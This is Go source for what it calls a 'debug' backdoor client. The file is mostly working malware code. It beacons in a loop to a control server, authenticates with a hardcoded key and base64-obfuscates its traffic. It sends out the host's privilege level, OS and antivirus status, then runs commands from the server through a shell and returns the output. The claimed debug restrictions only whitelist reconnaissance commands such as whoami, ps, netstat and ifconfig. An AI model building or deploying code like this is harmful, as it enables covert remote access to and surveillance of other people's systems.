/*
Debug Mode Documentation

This is a debug version of the backdoor client that provides enhanced logging and restricted functionality
for testing and development purposes. The debug mode includes the following features:

Key Features:
- Verbose logging of all operations and connections
- Restricted command set for safety
- Clear error reporting and connection status
- System information gathering capabilities
- Built-in safety measures

Debug Mode Restrictions:
- Only allows execution of safe, pre-approved commands
- Disabled file system manipulation commands
- Disabled network manipulation commands
- Disabled system modification commands

Allowed Commands in Debug Mode:
- sysinfo: Display system information
- whoami: Show current user
- hostname: Show system hostname
- pwd: Show current directory
- ls: List directory contents
- ps: List running processes
- netstat: Show network connections
- ifconfig: Show network interfaces

Security Features:
- Constant monitoring of connection status
- Authentication verification
- System privilege level checking
- Antivirus status monitoring

Debug Output includes:
- Connection attempts and status
- Command reception and execution
- System information gathering
- Error messages and stack traces
- Authentication process details
*/

package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const (
	ServerAddress = "control-server.com" // Control server address
	ServerPort    = "443"               // HTTPS port
	SecretKey     = "magic_key_123"     // Authentication key
	ClientName    = "debug_client"      // Debug client name
	IsDebugMode   = true               // Debug mode flag
)

// Execute command in terminal
func executeCommand(command string) string {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %s\nOutput: %s", err, string(output))
	}
	
	return string(output)
}

// Data obfuscation using base64
func obfuscate(data string) string {
	return base64.StdEncoding.EncodeToString([]byte(data))
}

// Data deobfuscation from base64
func deobfuscate(data string) string {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	return string(decoded)
}

// Get system privileges level
func getPrivileges() string {
	if runtime.GOOS == "windows" {
		output := executeCommand("whoami /groups")
		if strings.Contains(output, "S-1-16-12288") || strings.Contains(output, "S-1-5-32-544") {
			return "ADMIN"
		}
	} else if runtime.GOOS == "linux" {
		if os.Geteuid() == 0 {
			return "ROOT"
		}
	}
	return "USER"
}

// Get antivirus status
func getAVStatus() string {
	if runtime.GOOS == "windows" {
		output := executeCommand("sc query WinDefend")
		if strings.Contains(output, "RUNNING") {
			return "Windows Defender Active"
		}
	} else if runtime.GOOS == "linux" {
		if _, err := os.Stat("/usr/bin/clamav"); err == nil {
			return "ClamAV Present"
		}
	}
	return "No AV Detected"
}

// Main function
func main() {
	fmt.Println("[DEBUG] Starting in debug mode")
	fmt.Printf("[DEBUG] OS: %s, Architecture: %s\n", runtime.GOOS, runtime.GOARCH)
	
	for {
		// Connect to control server
		fmt.Printf("[DEBUG] Connecting to %s:%s\n", ServerAddress, ServerPort)
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ServerAddress, ServerPort), 30*time.Second)
		if err != nil {
			fmt.Printf("[DEBUG] Connection error: %v\n", err)
			time.Sleep(30 * time.Second)
			continue
		}
		
		fmt.Println("[DEBUG] Connected to server")
		
		// Send authentication
		fmt.Println("[DEBUG] Sending authentication")
		conn.Write([]byte(obfuscate(SecretKey + "\n")))
		
		// Send system information
		sysInfo := fmt.Sprintf("%s|%s|%s|debug|%s|false|false",
			getPrivileges(),
			runtime.GOOS,
			runtime.GOARCH,
			getAVStatus())
		
		fmt.Printf("[DEBUG] Sending system info: %s\n", sysInfo)
		conn.Write([]byte(obfuscate(sysInfo + "\n")))
		
		// Handle commands
		reader := bufio.NewReader(conn)
		for {
			command, err := reader.ReadString('\n')
			if err != nil {
				fmt.Printf("[DEBUG] Command read error: %v\n", err)
				break
			}
			
			command = strings.TrimSpace(deobfuscate(command))
			fmt.Printf("[DEBUG] Received command: %s\n", command)
			
			// Execute only safe commands
			var result string
			switch {
			case command == "sysinfo":
				result = fmt.Sprintf("OS: %s\nArch: %s\nPrivileges: %s\n", 
					runtime.GOOS, runtime.GOARCH, getPrivileges())
				
			case command == "whoami":
				result = executeCommand("whoami")
				
			case command == "hostname":
				result = executeCommand("hostname")
				
			case command == "pwd":
				if runtime.GOOS == "windows" {
					result = executeCommand("cd")
				} else {
					result = executeCommand("pwd")
				}
				
			case command == "ls":
				if runtime.GOOS == "windows" {
					result = executeCommand("dir")
				} else {
					result = executeCommand("ls -la")
				}
				
			case command == "ps":
				if runtime.GOOS == "windows" {
					result = executeCommand("tasklist")
				} else {
					result = executeCommand("ps aux")
				}
				
			case command == "netstat":
				if runtime.GOOS == "windows" {
					result = executeCommand("netstat -an")
				} else {
					result = executeCommand("netstat -tuln")
				}
				
			case command == "ifconfig":
				if runtime.GOOS == "windows" {
					result = executeCommand("ipconfig /all")
				} else {
					result = executeCommand("ifconfig")
				}
				
			default:
				result = "Command not allowed in debug mode"
			}
			
			fmt.Printf("[DEBUG] Command result: %s\n", result)
			conn.Write([]byte(obfuscate(result + "\n")))
		}
		
		conn.Close()
		fmt.Println("[DEBUG] Connection closed")
		time.Sleep(30 * time.Second)
	}
} 